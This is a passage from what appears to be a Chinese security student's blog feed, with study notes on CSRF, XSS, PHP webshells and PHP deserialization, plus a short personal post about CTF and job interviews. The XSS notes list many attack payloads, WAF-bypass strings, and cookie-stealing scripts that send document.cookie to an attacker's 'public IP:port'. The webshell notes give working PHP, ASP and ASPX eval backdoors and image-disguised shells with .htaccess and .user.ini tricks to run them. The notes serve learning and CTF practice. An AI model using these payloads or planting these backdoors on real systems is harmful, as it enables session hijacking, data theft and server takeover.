title="危害"></a>危害</h4><ol><li>对网站管理员进行攻击</li><li>修改受害网站上的用户账户和数据</li><li>账户劫持</li><li>传播CSRF蠕虫进行大规模攻击</li><li>利用csrf进行拖库</li><li>利用其他漏洞进行组合拳攻击</li><li>针对路由器的csrf攻击</li></ol><h4 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h4><ol><li>尽量使用POST，限制GET；</li><li>浏览器Cookie策略（时间生存周期管理和签名校验管理）；</li><li>加验证码；</li><li>Referer Check；</li><li>Anti CSRF Token；</li></ol><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>更改数据包POST/GET</li><li>修改Referer</li><li>利用XSS漏洞或其他方法将代码注入目标服务器，诱使受害者触发</li><li>使用Burp右键tool里生成一个PoC</li></ol><p>好像就这么多，CSRF没啥好讲的了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h4&gt;&lt;p&gt;是社工的一种，不大流行，但如果被成功利用，危害很大。&lt;/p&gt;
&lt;h4 id=&quot;XSS与CSRF区别&quot;&gt;&lt;a href=&quot;#XSS与CSRF区</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>过去两个月干了啥？</title>
    <link href="https://liu1272.github.io/2023/07/07/%E8%BF%87%E5%8E%BB%E4%B8%A4%E4%B8%AA%E6%9C%88%E5%B9%B2%E4%BA%86%E5%95%A5%EF%BC%9F/"/>
    <id>https://liu1272.github.io/2023/07/07/%E8%BF%87%E5%8E%BB%E4%B8%A4%E4%B8%AA%E6%9C%88%E5%B9%B2%E4%BA%86%E5%95%A5%EF%BC%9F/</id>
    <published>2023-07-07T05:36:00.000Z</published>
    <updated>2023-07-07T06:18:50.516Z</updated>
    
    <content type="html"><![CDATA[<p>也没干啥正事，天天打CTF有点倦了，休息一下。</p><p>首先吐槽一下web方向的一部分题目<br>经常能遇到各种各样的脑瘫题目完全脱离现实<br>有的知识点并不实用就罢了，出题人为了出点新题还会把题目设置得脑洞要特别大才能做出来<br>你们说 <code>Misc</code> 安全杂项本来就是这样那就算了， <code>Web</code> 安全也这样真的合适吗？<br>不过幸好现在 CTF 大赛都已经往实战的方向走了。<br>然后就是区块链，上次陕西省赛的区块链给个纸条猜地址是什么鬼……</p><p>除了CTF以外，自己也挖了几个洞，差不多总结了一套渗透的方案</p><p>7月前后到处发简历，想参加一下护网、实习之类的攒攒经验<br>在面试了两三个之后，感觉身为大一还是太菜了，根本抢不过高年级的<br>我总结了一下常见的问题（可能是常见的吧）：</p><ol><li>正常的询问年龄学历，对岗位的了解</li><li><code>OWASP top10</code> 原理、预防、实践（深度看具体情况）</li><li>SQLmap之类渗透工具的使用</li><li>实战中不同情况下的处理情况（只能多实践了）</li><li>ip，同源策略，DNS等等网络相关的问题<br>如果把市面上流传的面筋背个滚瓜烂熟大概初级的岗位面试是没太大问题</li></ol><p>后面几天先把之前的笔记修补更正一下<br>回家之后再学习红蓝相关的技术吧<br>有空再学学区块链合约审计之类的</p><p>行吧，不知道说啥就这样吧<br>下次见</p><p><a href="https://smms.app/image/J5wCygPKH4mBueN" target="_blank"><img src="https://s2.loli.net/2023/07/07/J5wCygPKH4mBueN.gif" width="300" /></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;也没干啥正事，天天打CTF有点倦了，休息一下。&lt;/p&gt;
&lt;p&gt;首先吐槽一下web方向的一部分题目&lt;br&gt;经常能遇到各种各样的脑瘫题目完全脱离现实&lt;br&gt;有的知识点并不实用就罢了，出题人为了出点新题还会把题目设置得脑洞要特别大才能做出来&lt;br&gt;你们说 &lt;code&gt;Misc&lt;/</summary>
      
    
    
    
    <category term="随笔" scheme="https://liu1272.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="随笔" scheme="https://liu1272.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>XSS跨站攻击</title>
    <link href="https://liu1272.github.io/2023/04/21/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/"/>
    <id>https://liu1272.github.io/2023/04/21/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/</id>
    <published>2023-04-21T06:32:00.000Z</published>
    <updated>2023-07-17T17:30:14.809Z</updated>
    
    <content type="html"><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>   XSS又叫CSS（Cross Site Script）是指恶意攻击者往Web页面里插入恶意Script代码<br>   当用户<code>浏览该页</code>时，其中的Script代码会被执行，从而达到恶意攻击用户的目的。<br>   xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，所以xss漏洞关键就是寻找参数未过滤的输出函数。<br>   常见的输出函数有：echo printf print print_r sprintf die var-dump var_export</p><h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><p>（1）攻击者对含有漏洞的服务器发起XSS攻击（注入JS代码）<br>（2）诱使受害者打开受到攻击的服务器URL<br>（3）受害者在Web浏览器中打开URL时自动执行恶意脚本</p><h4 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h4><p>（1）反射型XSS：&lt;非持久化&gt;<br>需要欺骗用户自己去点击链接才能触发XSS代码，一般容易出现在搜索页面，由后端代码进行处理。<br>（2）存储型XSS：&lt;持久化&gt;<br>每当有用户访问污染页面的时候都会触发代码执行。代码存储在服务器数据库中，如在个人信息或发表文章等地方。<br>（3）DOM型XSS：<br>DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。<br>DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。<br>客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行。<br>如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。<br>一般是浏览器前端代码进行处理。<br><em><strong>反射和dom的区别:<br>DOM-XSS是javascript处理输出， 而反射性xss是后台程序处理</strong></em></p><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>1.挂马<br>2.盗取用户Cookie。<br>3.DOS（拒绝服务）客户端浏览器。<br>4.钓鱼攻击，高级的钓鱼技巧。<br>5.删除目标文章、恶意篡改数据、嫁祸。<br>6.劫持用户Web行为，甚至进一步渗透内网。<br>7.爆发Web2.0蠕虫。<br>8.蠕虫式的DDoS攻击。<br>9.蠕虫式挂马攻击、刷广告、刷浏量、破坏网上数据</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>各种标签的XSS形式</strong></p><pre><code>&lt;script&gt; 标签用于定义客户端脚本，比如 JavaScript。&lt;script&gt;alert(1);&lt;/script&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;&lt;img&gt; 标签定义 HTML 页面中的图像。&lt;img src=1 onerror=alert(1);&gt;&lt;img src=1 onerror=alert(&quot;xss&quot;);&gt;&lt;input&gt; 标签规定了用户可以在其中输入数据的输入字段。onfocus 事件在对象获得焦点时发生：&lt;input onfocus=alert(1);&gt;&lt;input onblur=alert(1) autofocus&gt;&lt;input autofocus&gt;&lt;input onfocus=&quot;alert(1);&quot; autofocus&gt;&quot; οnclick=alert(1)&gt;        这样需要点击一下输入框&lt;br&gt;&quot; onmouseover=alert(1)&gt;    需要鼠标划过输入框&lt;br&gt;&lt;details&gt; 标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。ontoggle 事件规定了在用户打开或关闭 &lt;details&gt; 元素时触发：&lt;details ontoggle=alert(1);&gt;&lt;svg&gt; 标签用来在HTML页面中直接嵌入SVG 文件的代码。&lt;svg onload=alert(1);&gt;&lt;select&gt; 标签用来创建下拉列表。&lt;select onfocus=alert(1)&gt;&lt;/select通过autofocus属性规定当页面加载时元素应该自动获得焦点，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：&lt;select onfocus=alert(1) autofocus&gt;&lt;iframe&gt; 标签会创建包含另外一个文档的内联框架。&lt;iframe onload=alert(1);&gt;&lt;/iframe&gt;&lt;video&gt; 标签定义视频，比如电影片段或其他视频流。&lt;audio&gt; 标签定义声音，比如音乐或其他音频流。&lt;audio src=x  onerror=alert(1);&gt;&lt;video&gt;&lt;source onerror=alert(1)&gt;&lt;body&gt; 标签定义文档的主体。&lt;body onload=alert(1);&gt;onscroll 事件在元素滚动条在滚动时触发。我们可以利用换行符以及autofocus，当用户滑动滚动条的时候自动触发，无需用户去点击触发&lt;bodyonscroll=alert(1);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;&lt;textarea&gt; 标签定义一个多行的文本输入控件。&lt;textarea onfocus=alert(1); autofocus&gt;&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐&lt;marquee onstart=alert(1)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以&lt;isindex type=image src=1 onerror=alert(1)&gt;//仅限于IE</code></pre><p><strong>绕过过滤方法</strong></p><pre><code>【大小写】【没有分号】【Flash】【Fuzz进行测试】【双层标签绕过】【空格过滤】/**/注释符号绕过/符号绕过【引号过滤】如果是html标签中，可以不用引号在js中，可以用反引号代替单双引号【括号过滤】使用throw绕过 throw 语句用于当错误发生时抛出一个错误【关键字过滤】大小写绕过双写绕过字符串拼接绕过（利用eval()函数）在js中用反引号代替单双引号编码绕过    Unicode编码绕过    &lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&quot;&gt;    javasc&amp;#x72;&amp;#x69;pt:alert(/xss/)          (编码了r和i)    &lt;img src=&quot;x&quot; onerror=&quot;eval(&#39;\u0061&#39;)&quot;&gt;    url编码绕过    &lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#39;%61&#39;))&quot;&gt;    &lt;iframe src=&quot;data:text/html,%3C&quot;&gt;&lt;/iframe&gt;    Ascii码绕过    &lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108))&quot;&gt;    hex绕过    &lt;img src=x onerror=eval(&#39;\x61&#39;)&gt;    base64绕过    &lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#39;XXXXX==&#39;))&quot;&gt;    &lt;iframe src=&quot;data:text/html;base64,XXXXX==&quot;&gt;【过滤url地址】使用url编码    &lt;img src=&quot;x&quot; onerror=document.location=`http://%77/`&gt;    javasc&amp;#x72;&amp;#x69;pt:alert(&#39;xsshttp://&#39;)使用IP    十进制IP    &lt;img src=&quot;x&quot; onerror=document.location=`http://2130706433/`&gt;    八进制IP    &lt;img src=&quot;x&quot; onerror=document.location=`http://0177.0.0.01/`&gt;    十六进制IP    &lt;img src=&quot;x&quot; onerror=document.location=`http://0x7f.0x0.0x0.0x1/`&gt;    html标签中用//代替http://    &lt;img src=&quot;x&quot; onerror=document.location=`//www.baidu.com`&gt;    使用\\    使用中文逗号代替英文逗号    &lt;img src=&quot;x&quot; onerror=&quot;document.location=`http:\\www。baidu。com`&quot;&gt;【单引号闭合+htmlspecialchars函数绕过】&#39;onmouseover=&#39;alert(/xss/)【JavaScript伪协议】&quot;&gt;&lt;a href=javascript:alert(/xss/)&gt;                  o_n和&lt;scr_ipt&gt;过滤【HttpOnly绕过】什么是HttpOnly？cookie中设置了HttpOnly属性后js脚本将无法读取到cookie信息但是使用下面这样仍然可以读取Cookie cookies[]=request.getCookies();【其它waf绕过思路】（1）标签语法替换&lt;scr&lt;script&gt;ipt&gt;alert(&quot;XSS&quot;)&lt;/scr&lt;script&gt;ipt&gt;&lt;script src=&quot;http://xxx/&quot;&gt;&lt;/script&gt;（2）特殊符号干扰（3）提交方式更改（4）垃圾数据溢出（5）加密解密算法（6）结合其他漏洞绕过</code></pre><h4 id="结合其他漏洞绕过"><a href="#结合其他漏洞绕过" class="headerlink" title="结合其他漏洞绕过"></a>结合其他漏洞绕过</h4><pre><code>WAF名称：CloudflarePayload：&lt;a”/onclick=(confirm)()&gt;click绕过技术：非空格填充WAF名称：WordfencePayload：&lt;a/href=javascript&amp;colon;alert()&gt;click绕过技术：数字字符编码WAF名称：BarracudaPayload：&lt;a/href=Java%0a%0d%09script&amp;colon;alert()&gt;click绕过技术：数字字符编码WAF名称：ComodoPayload：&lt;d3v/onauxclick=(((confirm)))“&gt;click绕过技术：黑名单中缺少事件处理器以及函数调用混淆WAF名称：F5Payload：&lt;d3v/onmouseleave=[2].some(confirm)&gt;click绕过技术：黑名单中缺少事件处理器以及函数调用混淆WAF名称：ModSecurityPayload：&lt;details/open/ontoggle=alert()&gt;绕过技术：黑名单中缺少标签或事件处理器WAF名称：dotdefenderPayload：&lt;details/open/ontoggle=(confirm)()//绕过技术：黑名单中缺少结束标签、事件处理器和函数调用混淆</code></pre><h4 id="还有一些很重要的东西"><a href="#还有一些很重要的东西" class="headerlink" title="还有一些很重要的东西"></a>还有一些很重要的东西</h4><p>xss网站最好自己搭建一个，因为可能会过滤xss关键字<br>最好使用只带有数字的域名或ip<br>利用vps，用nc端口监听</p><h4 id="XSStrike工具使用"><a href="#XSStrike工具使用" class="headerlink" title="XSStrike工具使用"></a>XSStrike工具使用</h4><p><a href="https://blog.csdn.net/RuoLi_s/article/details/113192507?ops_request_misc=&request_id=&biz_id=102&utm_term=XSStrike&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-113192507.nonecase&spm=1018.2226.3001.4187"><strong>使用说明</strong></a></p><h4 id="XSS的防御措施"><a href="#XSS的防御措施" class="headerlink" title="XSS的防御措施"></a>XSS的防御措施</h4><p>（1）编码：对输入内容的特定字符进行编码，例如表示html标记的 &lt; &gt; 等符号<br>（2）过滤：移除用户上传的DOM属性，如onerror等，移除用户上传的style节点，script节点，iframe节点等。<br>（3）校正：避免直接对HTML Entity编码，使用DOM Prase转换，校正不配对的DOM标签。<br>（4）配置：对重要的cookie设置httpOnly, 防止客户端通过document.cookie读取 cookie<br>（5）不要使用Eval来解析并运行不确定的数据或代码，对于JSON解析请使用 JSON.parse()<br>方法。</p><h4 id="各种姿势"><a href="#各种姿势" class="headerlink" title="各种姿势"></a>各种姿势</h4><pre><code>&lt;script&gt;window.open(&#39;http://你的公网ip:端口号/&#39;+document.cookie)&lt;/script&gt;&lt;script&gt;var img = document.createElement(&quot;img&quot;);img.src = &quot;http://你的公网ip:端口号/?cookie=&quot;+document.cookie;&lt;/script&gt;&lt;script&gt;window.location.href=&#39;http://你的公网ip:端口号/&#39;+document.cookie&lt;/script&gt;&lt;script&gt;location.href=&#39;http://你的公网ip:端口号/&#39;+document.cookie&lt;/script&gt;&lt;input onfocus=&quot;window.open(&#39;http://你的公网ip:端口号/&#39;+document.cookie)&quot; autofocus&gt;&lt;svg onload=&quot;window.open(&#39;http://你的公网ip:端口号/&#39;+document.cookie)&quot;&gt;&lt;iframe onload=&quot;window.open(&#39;http://你的公网ip:端口号/&#39;+document.cookie)&quot;&gt;&lt;/iframe&gt;&lt;body onload=&quot;window.open(&#39;http://你的公网ip:端口号/&#39;+document.cookie)&quot;&gt;</code></pre><h3 id="RPO-攻击"><a href="#RPO-攻击" class="headerlink" title="RPO 攻击"></a>RPO 攻击</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>由于<strong>Apache 服务器对编码后的 url 不能正常解析，而 Nginx 却可以正常解析。</strong><br>（Apache 服务器不能解析%2f 是默认配置问题，可见：链接包含”%2F”导致mod_rewrite失效）<br>假设现在有2个目录分别为aaa目录和bbb目录，利用浏览器与服务器对特殊构造的url的解析差异<br>能够让获取了aaa目录下的文件的浏览器误以为自己在bbb目录。<br>当aaa下的文件出现了相对路径的文件引用的时候，浏览器会去读取bbb目录下的该文件，从而造成了漏洞的产生。<br>目前来看此攻击方法依赖于浏览器和网络服务器的反应<br>基于服务器的Web缓存技术和配置差异，以及服务器和客户端浏览器的解析差异<br>利用前端代码中加载的css/js的相对路径来加载其他文件<br>最终浏览器将服务器返回的不是css/js的文件当做css/js来解析<br>从而导致XSS，信息泄露等漏洞产生。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h4&gt;&lt;p&gt;   XSS又叫CSS（Cross Site Script）是指恶意攻击者往Web页面里插入恶意Script代码&lt;br&gt;  </summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>一句话木马</title>
    <link href="https://liu1272.github.io/2023/04/16/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
    <id>https://liu1272.github.io/2023/04/16/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</id>
    <published>2023-04-16T15:01:00.000Z</published>
    <updated>2023-07-19T07:14:05.198Z</updated>
    
    <content type="html"><![CDATA[<h4 id="什么是一句话木马"><a href="#什么是一句话木马" class="headerlink" title="什么是一句话木马"></a>什么是一句话木马</h4><p>  一句话木马是一种短小精悍的恶意代码，通常只有一行之长。<br>  这种木马可以以上传文件、修改配置等方式将恶意代码植入到受害者服务器上<br>  然后通过一些特殊手法在服务器端执行，以达到入侵控制目的。</p><h4 id="常见的一句话木马"><a href="#常见的一句话木马" class="headerlink" title="常见的一句话木马"></a>常见的一句话木马</h4><p>我们接触的一句话木马大多为这种，它需要在PHP环境中才可使用</p><pre><code>&lt;?php @eval($_POST[cmd]);  ?&gt;</code></pre><h4 id="木马原理"><a href="#木马原理" class="headerlink" title="木马原理"></a>木马原理</h4><pre><code>（1）$_POST[cmd]    $_POST 是 PHP 中的一个超全局变量，POST方式提交的所有变量，都会保存在此数组中，变量名即为键名（2）eval()    eval() 函数在 PHP 中用于执行字符串中的代码并返回执行结果。    该函数对php语法要求严格，所传入语句必须以&quot; ; &quot;号结尾（3）@    符号@的作用是屏蔽该语句的报错信息    如果站点PHP版本&gt;=8.0的话会报错（4）脉络梳理    用eval函数，将我们post方式提交的名为cmd的变量，当做PHP代码执行，cmd变量可为任何攻击代码</code></pre><h4 id="可用于条件竞争的一句话木马"><a href="#可用于条件竞争的一句话木马" class="headerlink" title="可用于条件竞争的一句话木马"></a>可用于条件竞争的一句话木马</h4><pre><code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])；  ?&gt;&#39; ); ?&gt;</code></pre><p>这段代码是用来创建一个名为shell.php的文件，并在其中写入一段代码。<br>这段代码的作用是接受一个POST请求中的cmd参数，并将其作为PHP代码执行。</p><h4 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h4><p><strong>木马内容</strong></p><pre><code>GIF89a&lt;?php @eval($_POST[cmd])；  ?&gt; //GIF89a 为了绕过可能存在的MIME头检测</code></pre><p><strong>.htaccess文件</strong></p><pre><code>&lt;FilesMatch &quot;jpg&quot;&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;//大体意思是设置当前目录所有带jpg的文件名都使用php解析//无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行</code></pre><p><strong>.user.ini扩展文件</strong></p><pre><code>auto_prepend_file=shell.jpg //意思就是当前目录中的php文件的页头会自动去包含shell.jpg中的文件内容//auto_append_file 是页尾包含</code></pre><h4 id="一句话木马收集"><a href="#一句话木马收集" class="headerlink" title="一句话木马收集"></a>一句话木马收集</h4><p>ASP一句话木马：</p><pre><code>&lt;% execute(request(&quot;value&quot;)) %&gt;</code></pre><p>PHP一句话木马：</p><pre><code>&lt;?php @eval($_POST[&#39;value&#39;]); ?&gt;</code></pre><p>变形后的PHP一句话木马：</p><pre><code>&lt;?php  $x = $_GET[&#39;z&#39;];  @eval(&quot;$x;&quot;);?&gt;</code></pre><p>ASPX一句话木马：</p><pre><code>&lt;%@ Page Language=&quot;Jscript&quot; %&gt;&lt;% eval(Request.Item[&quot;value&quot;]) %&gt;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;什么是一句话木马&quot;&gt;&lt;a href=&quot;#什么是一句话木马&quot; class=&quot;headerlink&quot; title=&quot;什么是一句话木马&quot;&gt;&lt;/a&gt;什么是一句话木马&lt;/h4&gt;&lt;p&gt;  一句话木马是一种短小精悍的恶意代码，通常只有一行之长。&lt;br&gt;  这种木马可以以上传文件</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化</title>
    <link href="https://liu1272.github.io/2023/04/16/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://liu1272.github.io/2023/04/16/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2023-04-15T16:12:00.000Z</published>
    <updated>2023-04-18T07:44:30.341Z</updated>
    
    <content type="html"><![CDATA[<h4 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h4><p>在各类语言中，将对象的状态信息转换为可存储或可传输的过程就是序列化<br>序列化的逆过程就是便是反序列化，主要是为了方便对象传输。<br>为了完整安全地将对象保存到文件或数据库中，或者在网络上传输对象，就需要使用序列化。</p><p>不同类型数据序列化之后的形式:</p><pre><code>$number = 34;$float = 11.11111;$str = &#39;user&#39;;$bool = true;$null = NULL;$arr = array(&#39;a&#39; =&gt; 10, &#39;b&#39; =&gt; 200);$test = new TEST(&#39;uu&#39;, true);$test2 = new TEST(&#39;uu&#39;, true);$test2-&gt;data = &amp;$test2-&gt;data2;i:34;d:11.11111;s:4:&quot;user&quot;;b:1;N;a:2:&#123;s:1:&quot;a&quot;;i:10;s:1:&quot;b&quot;;i:200;&#125;O:4:&quot;TEST&quot;:3:&#123;s:4:&quot;data&quot;;s:2:&quot;uu&quot;;s:5:&quot;data2&quot;;s:9:&quot;dazzhuang&quot;;s:10:&quot;TESTpass&quot;;b:1;&#125;O:4:&quot;TEST&quot;:3:&#123;s:4:&quot;data&quot;;s:9:&quot;dazzhuang&quot;;s:5:&quot;data2&quot;;R:2;s:10:&quot;TESTpass&quot;;b:1;&#125;只序列化成员函数，不序列化成员方法私有属性的序列化加上类名并且在成员函数前后加上空(url编码的%00)对象内调用对象时序列化后显示为套娃形式</code></pre><p>反序列化之后:</p><pre><code>只实例化new之后object(test)#1 (3) &#123;  [&quot;a&quot;]=&gt;                      // public  string(6) &quot;benben&quot;  [&quot;b&quot;:protected]=&gt;            // protected  int(666)  [&quot;c&quot;:&quot;test&quot;:private]=&gt;       // private  bool(false)&#125;反序列化的过程只看序列化链，不管存不存在这个类反序列化不触发成员方法，也不改变类的成员方法</code></pre><p><strong>魔术方法是什么？</strong><br>是一个预定义好的，在特定情况下自动触发的方法<br><strong>魔术方法有什么作用？</strong><br>反序列化过程中，代码通过调用方法，触发代码执行<br><strong>魔术方法需要了解什么？</strong><br>触发时机、触发优先级、功能、参数、返回值</p><h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>反序列化过程中，unserialize()接收的值 (字符串)可控<br>通过更改这个值 (字符串)，得到所需要的代码，即生成的对象的属性值</p><h4 id="魔术方法全解"><a href="#魔术方法全解" class="headerlink" title="魔术方法全解"></a>魔术方法全解</h4><pre><code>（1）  __construct()触发时机: 实例化对象后立即触发功能: 提前清理不必要内容参数: 非必要返回值特点: 序列化和反序列化时不会触发（2）  __destruct()触发时机: 销毁对象时立即触发功能: 关闭文件、释放结果集参数: 不能带有任何参数特点: 序列化时不会触发（3）  __sleep()触发时机: 序列化serialize()之前功能: 返回需要被序列化存储的成员属性，删除不必要的属性参数: 成员属性返回值: 需要被序列化存储的成员属性（4）  __wakeup()触发时机: 反序列化unserialize()之前功能: 重新建立数据库连接或执行其他初始化操作参数: 不能带有任何参数特点: 序列化时不会触发（5）  __toString()触发时机: 对象被当成字符串调用时功能: 以字符串表示对象，可以自定义格式，常用于构造pop链参数: 不能带有任何参数（6）  __invoke()触发时机: 尝试以调用函数的方式调用一个对象时功能: 将一个对象像函数一样调用，在对象上下文中实现函数式编程参数: 可以接受任意数量的参数（7）  __call()触发时机: 调用一个不存在的方法时参数: 可传参返回值: 调用的不存在的方法的名称和参数（8）  __callStatic()触发时机: 静态调用或调用成员常量时使用的方法不存在时参数: 可传参返回值: 调用的不存在的方法的名称和参数（9）  __get()触发时机: 访问不存在或不可访问的属性时参数: 可传参返回值:不存在的成员属性的名称和赋的值（10）  __set()触发时机: 给不存在或不可访问的属性赋值时参数: 可传参返回值: 不存在的成员属性的名称和赋的值（11）  __isset()触发时机: 对不可访问属性使用isset()或empty()时参数: 可传参返回值: 不存在的成员属性的名称（12）  __unset()触发时机: 对不可访问属性使用unset()时参数: 可传参返回值: 不存在的成员属性的名称（13）  __clone()触发时机: 当使用clone拷贝完成一个对象后，新对象会自动调用（14）  __set_state()触发时机: 使用var_export()函数导出一个对象时，或者使用eval()函数导入一个对象时参数: 只有一个参数(数组)，包含对象的状态信息。键是对象的属性名，值是对象的属性值。功能: 用于返回一个对象的状态数组特点: 只能在类中定义，不能在对象中定义（15）  __autoload()触发时机: 使用未定义的类时，或者使用未加载的类时功能: 根据类名动态加载对应的类文件，并定义对应的类参数: 只有一个参数，即要加载的类名特点: PHP 7.2.0及以上版本中，__autoload()魔术方法已被废弃，推荐使用spl_autoload_register()（16）  __debugInfo()触发时机: 在使用var_dump()函数打印对象时功能: 被var_dump()函数输出一个数组，包含对象的调试信息参数: 没有参数</code></pre><h4 id="POP链前置知识"><a href="#POP链前置知识" class="headerlink" title="POP链前置知识"></a>POP链前置知识</h4><p><strong>POP是什么？</strong><br>在反序列化中，我们能控制的数据就是对象中的属性值<br>POP链就是利用魔法方法在里面进行多次跳转然后获取敏感数据的种payload<br><strong>POC是什么？</strong><br>POC (Proof of concept)又称概念验证，可以理解成漏洞验证程序<br>POC是一段不完整的程序，仅仅是为了证明提出者的观点的一段代码<br><strong>如何分析POP链？</strong><br>最好使用反推法！<br>1.找到可利用的函数<br>2.根据参数的传递与调用反推出哪个变量需要是什么<br>3.分析判断有哪些魔术方法可以被利用以及如何被调用<br><strong>如何利用漏洞？</strong><br><img src="https://s2.loli.net/2023/04/16/wSFIaq7h4Ol32tg.png" alt="POP链构造例子"><br><strong>构造如下:</strong><br><img src="https://s2.loli.net/2023/04/16/iSj1gtLHqTQaNsx.png" alt="POP链构造例子解析"></p><h4 id="字符串逃逸——增多"><a href="#字符串逃逸——增多" class="headerlink" title="字符串逃逸——增多"></a>字符串逃逸——增多</h4><p>字符串以<code>;&#125;</code>结束，后面的不看<br>空（N）不算在内</p><p><img src="https://s2.loli.net/2023/04/17/qd4L8MtOH2bPKQk.png" alt="字符串增多例题01"><br><img src="https://s2.loli.net/2023/04/17/jS5ActwNfYMXhbx.png" alt="字符串增多例题02"></p><h4 id="字符串逃逸——减少"><a href="#字符串逃逸——减少" class="headerlink" title="字符串逃逸——减少"></a>字符串逃逸——减少</h4><p><img src="https://s2.loli.net/2023/04/18/71zLkKi9cTGwZho.png" alt="字符串减少例题01"><br><img src="https://s2.loli.net/2023/04/18/KbeAu2j7RMiWCkT.png" alt="字符串减少02例题"></p><h4 id="weakup魔术方法绕过"><a href="#weakup魔术方法绕过" class="headerlink" title="weakup魔术方法绕过"></a>weakup魔术方法绕过</h4><p>反序列化漏洞:<br>CVE-2016-7124<br>漏洞产生原因:<br>如果存在wakeup方法则反序列化前先调用wakeup方法<br>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过wakeup()<br>如果同时还有正则表达式匹配可以用+6代替6<br>记得url编码</p><h4 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h4><p><img src="https://s2.loli.net/2023/04/18/SQVydNngi8rAEkm.png" alt="前置知识"><br><img src="https://s2.loli.net/2023/04/18/mXDo6Qh9V4KF58E.png" alt="PHP存储时"><br><img src="https://s2.loli.net/2023/04/18/bKH46heyWJgDrlw.png" alt="PHP_serialize存储时"><br><img src="https://s2.loli.net/2023/04/18/JRzB3V9TbdjMsUP.png" alt="PHP_binary存储时（少见）"><br><img src="https://s2.loli.net/2023/04/18/xcVBeOpRk5vQPG1.png" alt="漏洞成因及其利用"></p><h4 id="phar反序列化"><a 